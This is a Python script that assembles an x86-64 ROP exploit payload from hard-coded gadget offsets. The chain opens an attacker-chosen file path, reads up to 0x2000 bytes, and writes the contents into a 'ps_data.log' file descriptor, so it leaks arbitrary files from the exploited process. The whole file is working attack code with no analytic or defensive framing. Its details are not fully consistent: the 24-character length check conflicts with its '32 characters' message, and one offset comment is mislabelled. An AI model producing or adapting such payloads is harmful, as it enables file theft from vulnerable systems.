from struct import pack


def give_payload(offset, path):
    # process path into chunks that can go in memory
    if len(path) > 24:
        raise Exception('max 32 characters allowed')

    split = []
    for i in range(0, 32, 8):
        chars = path[i:i+8]
        split.append(chars.encode('utf-8') + b'\x00'*(8-len(chars)))

    # Padding goes here
    p = b''

    # put write fd where I control
    p += pack('<Q', offset + 0x00877f) # pop rax ; ret
    p += pack('<Q', offset + 0x2e7014) # @ .data + 16 -> fd for ps_data.log
    p += pack('<Q', offset + 0x08f7a9) # mov eax, dword ptr [rax] ; ret
    p += pack('<Q', offset + 0x01a533) # pop rsi ; ret
    p += pack('<Q', offset + 0x2e7000) # @ .data
    p += pack('<Q', offset + 0x08ee81) # mov qword ptr [rsi], rax ; ret

    # set string for file path
    p += pack('<Q', offset + 0x01a533) # pop rsi ; ret
    p += pack('<Q', offset + 0x2e7008) # @ .data + 8
    p += pack('<Q', offset + 0x00877f) # pop rax ; ret
    p += split[0]
    p += pack('<Q', offset + 0x08ee81) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', offset + 0x01a533) # pop rsi ; ret
    p += pack('<Q', offset + 0x2e7010) # @ .data + 16
    p += pack('<Q', offset + 0x00877f) # pop rax ; ret
    p += split[1]
    p += pack('<Q', offset + 0x08ee81) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', offset + 0x01a533) # pop rsi ; ret
    p += pack('<Q', offset + 0x2e7018) # @ .data + 24
    p += pack('<Q', offset + 0x00877f) # pop rax ; ret
    p += split[2]
    p += pack('<Q', offset + 0x08ee81) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', offset + 0x01a533) # pop rsi ; ret
    p += pack('<Q', offset + 0x2e7020) # @ .data + 32
    p += pack('<Q', offset + 0x00877f) # pop rax ; ret
    p += split[3]
    p += pack('<Q', offset + 0x08ee81) # mov qword ptr [rsi], rax ; ret


    # open file
    p += pack('<Q', offset + 0x008876) # pop rdi ; ret
    p += pack('<Q', offset + 0x2e7008) # @ .data + 8
    p += pack('<Q', offset + 0x01a533) # pop rsi ; ret
    p += pack('<Q', 0x2)
    p += pack('<Q', offset + 0x01cca2) # pop rdx ; ret
    p += pack('<Q', 0x0)
    p += pack('<Q', offset + 0x056630) # call open

    # read file
    p += pack('<Q', offset + 0x01a533) # pop rsi ; ret
    p += pack('<Q', offset + 0x2e7028) # @ .data + 40
    p += pack('<Q', offset + 0x08ee81) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', offset + 0x01cca2) # pop rdx ; ret
    p += pack('<Q', offset + 0x2e7028) # @ .data + 40
    p += pack('<Q', offset + 0x0d17a4) # mov bh, 0xb4 ; mov edi, dword ptr [rdx] ; ret
    p += pack('<Q', offset + 0x01a533) # pop rsi ; ret
    p += pack('<Q', offset + 0x2e7030) # @ .data + 48
    p += pack('<Q', offset + 0x01cca2) # pop rdx ; ret
    p += pack('<Q', 0x2000)
    p += pack('<Q', offset + 0x0567f0) # call read

    # write file contents to data log
    p += pack('<Q', offset + 0x01cca2) # pop rdx ; ret
    p += pack('<Q', offset + 0x2e7000) # @ .data
    p += pack('<Q', offset + 0x0d17a4) # mov bh, 0xb4 ; mov edi, dword ptr [rdx] ; ret

    p += pack('<Q', offset + 0x01a533) # pop rsi ; ret
    p += pack('<Q', offset + 0x2e7028) # @ .data + 48

    p += pack('<Q', offset + 0x01cca2) # pop rdx ; ret
    p += pack('<Q', 0x2000)

    p += pack('<Q', offset + 0x0568c0) # call write

    p += pack('<Q', offset + 0x056b90) # call close

    return p
